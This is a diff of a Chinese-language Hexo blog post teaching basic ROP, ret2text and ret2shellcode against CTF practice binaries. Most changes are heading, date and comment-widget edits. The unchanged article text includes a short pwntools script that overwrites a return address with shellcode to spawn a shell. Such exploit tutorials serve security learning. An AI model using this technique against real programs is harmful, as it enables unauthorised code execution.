@@ -28,7 +28,7 @@
   
 
   
-    <meta name="description" content="1.基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变...">
+    <meta name="description" content="基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的...">
   
 
   <!-- feed -->
@@ -450,6 +450,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         
           
             
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/Pwn/">Pwn</a>
+    </a>
+  </div>
+
 
           
         
@@ -486,7 +493,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <h1 id="1-基本ROP"><a href="#1-基本ROP" class="headerlink" title="1.基本ROP"></a>1.基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+  <h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
 <p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
 <ul>
 <li>程序存在溢出，并且可以控制返回地址。</li>
@@ -498,7 +505,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <span id="more"></span>
 
 <p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201101141313724.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201101141313724.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201101141313724"></p>
-<h1 id="2-ret2text"><a href="#2-ret2text" class="headerlink" title="2.ret2text"></a>2.ret2text</h1><p>1.ret2text控制程序执行程序本身已有的代码（.text）。这种攻击方法是一种笼统描述，我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是所说的ROP</p>
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>1.ret2text控制程序执行程序本身已有的代码（.text）。这种攻击方法是一种笼统描述，我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是所说的ROP</p>
 <p>checksec<img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018230307566.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018230307566.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018230307566"></p>
 <p>其中没有开启栈溢出保护，这样就可以通过覆盖到返回地址执行程序</p>
 <p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018230928211.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201018230928211.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018230928211"></p>
@@ -528,7 +535,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure>
 
 <p>得到112，这个数字就是从输入内存可控起始地址到ret地址</p>
-<h1 id="3-ret2shellcode"><a href="#3-ret2shellcode" class="headerlink" title="3.ret2shellcode"></a>3.ret2shellcode</h1><p>先checksec<img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019104048263.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019104048263.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201019104048263"></p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>先checksec<img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019104048263.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019104048263.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201019104048263"></p>
 <p>没有开启栈不可行保护</p>
 <p>在IDA中可以看到该函数有gets函数，可以直接通过该函数覆盖到返回地址</p>
 <p><img src="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019103226027.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/image-20201019103226027.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201019103226027"></p>
@@ -548,7 +555,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>可以看到该esp地址为<code>0xffffcebc</code>到ebp<code>0xffffcf28</code> 的距离为108，再加上ebp的4，距离一共为112，写出payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h1 id="3-ret2syscall"><a href="#3-ret2syscall" class="headerlink" title="3.ret2syscall"></a>3.ret2syscall</h1>
+<h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1>
   
   
     
@@ -582,10 +589,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-05T17:48:38+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-01T22:05:05+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 5, 2021</p>
+    <p>更新于：Apr 1, 2021</p>
   </a>
 </div>
 
@@ -607,7 +614,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/&title=Pwn-基础ROP - Hexo&summary=1.基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/&title=Pwn-基础ROP - Hexo&summary=基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件
 
 程序存在溢出，并且可以控制返回地址。
@@ -627,7 +634,7 @@ rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/&title=Pwn-基础ROP - Hexo&summary=1.基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/&title=Pwn-基础ROP - Hexo&summary=基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件
 
 程序存在溢出，并且可以控制返回地址。
@@ -647,7 +654,7 @@ rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/&title=Pwn-基础ROP - Hexo&summary=1.基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/10/18/Pwn/Pwn-%E5%9F%BA%E7%A1%80ROP/&title=Pwn-基础ROP - Hexo&summary=基本ROP随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件
 
 程序存在溢出，并且可以控制返回地址。
@@ -687,13 +694,13 @@ rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来
       
         <a class='prev' href='/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/'>
           <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Pwn-常见利用方法</p>
-          <p class='content'>1.Shellcode 一般指获取shell代码，针对数据未开启可执行保护NX，可以将shellcode直接布置在堆栈等可写可执行区域保护NX，可以将shellcode直接布置在堆栈等可写可执行...</p>
+          <p class='content'>Shellcode 一般指获取shell代码，针对数据未开启可执行保护NX，可以将shellcode直接布置在堆栈等可写可执行区域保护NX，可以将shellcode直接布置在堆栈等可写可执行区域...</p>
         </a>
       
       
         <a class='next' href='/2020/10/18/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/'>
           <p class='title'>Pwn-程序保护机制<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>1.STACK Canary栈溢出保护1.当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被...</p>
+          <p class='content'>STACK Canary栈溢出保护1.当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变...</p>
         </a>
       
     </div>
@@ -736,7 +743,7 @@ rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#rop%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86%EF%BC%9A%E5%B0%86%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E6%94%B9%E6%88%90%E2%80%9Cpop-%EF%BC%8Cret%E2%80%9D%E6%8C%87%E4%BB%A4%E7%9A%84gadget%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%BC%B9%E5%87%BA%E5%90%8E%E7%BB%AD%E7%9A%84args%EF%BC%8C%E6%88%90%E4%B8%BArop%E5%BD%A2%E5%BC%8F"><span class="toc-text">rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来弹出后续的args，成为rop形式</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="toc-text">基本ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#rop%E6%9E%84%E9%80%A0%E5%8E%9F%E7%90%86%EF%BC%9A%E5%B0%86%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E6%94%B9%E6%88%90%E2%80%9Cpop-%EF%BC%8Cret%E2%80%9D%E6%8C%87%E4%BB%A4%E7%9A%84gadget%EF%BC%8C%E7%94%A8%E6%9D%A5%E5%BC%B9%E5%87%BA%E5%90%8E%E7%BB%AD%E7%9A%84args%EF%BC%8C%E6%88%90%E4%B8%BArop%E5%BD%A2%E5%BC%8F"><span class="toc-text">rop构造原理：将返回地址改成“pop *，ret”指令的gadget，用来弹出后续的args，成为rop形式</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2syscall"><span class="toc-text">ret2syscall</span></a></li></ol>
     </div>
   </section>
 
@@ -1399,7 +1406,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"sqTMFb0PVPGr3O8jFPjCPlRd-gzGzoHsz","appKey":"c8anwbejIe6cHBJju8X7Wt3U","meta":["nick","mail"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":null,"appKey":null,"meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
